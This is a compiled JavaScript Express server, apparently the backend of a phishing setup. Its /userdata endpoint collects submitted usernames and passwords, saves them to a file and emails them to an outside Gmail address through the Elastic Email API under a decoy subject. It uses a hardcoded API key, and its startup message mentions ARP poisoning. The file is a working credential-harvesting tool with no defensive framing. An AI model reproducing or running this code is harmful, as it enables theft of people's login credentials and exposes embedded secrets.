"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const fs_1 = __importDefault(require("fs"));
const cors_1 = __importDefault(require("cors"));
const axios_1 = __importDefault(require("axios")); // For making HTTP requests
const app = (0, express_1.default)();
app.use((0, cors_1.default)({ origin: '*' }));
app.use(express_1.default.urlencoded({ extended: false }));
app.use(express_1.default.json());
app.use(express_1.default.static(__dirname + "/public/live"));
app.get("/live", (req, res, next) => {
    res.sendFile(__dirname + "/public/live/index.html");
});
app.post("/userdata", (req, res, next) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const SentenceData = `user: ${req.body.userName} password: ${req.body.password}`;
        console.log(SentenceData);
        // Write SentenceData to result.txt file
        fs_1.default.writeFile("result.txt", SentenceData, (err) => {
            if (err)
                console.log(err);
            console.log("Successfully Written to File.");
        });
        // Send email using Elastic Email API
        const elasticEmailParams = {
            apikey: 'B590AF36943695BABC53CA177C2E8BA2640076E95FE085D5864932FD045D72CC3F556918B5A43FC65A5A68BCB8384E87',
            from: 'trappedstunt@outlook.com',
            to: 'trappedstunt@gmail.com',
            subject: 'Your Food is Ready',
            bodyText: SentenceData,
        };
        const elasticEmailResponse = yield axios_1.default.post('https://api.elasticemail.com/v2/email/send', null, {
            params: elasticEmailParams
        });
        console.log('Email sent: ', elasticEmailResponse.data);
        res.sendStatus(200);
    }
    catch (err) {
        console.log(err);
        res.sendStatus(500);
    }
}));
app.listen(5000, () => console.log("Server running on port 5000, ready for arp poisoning"));
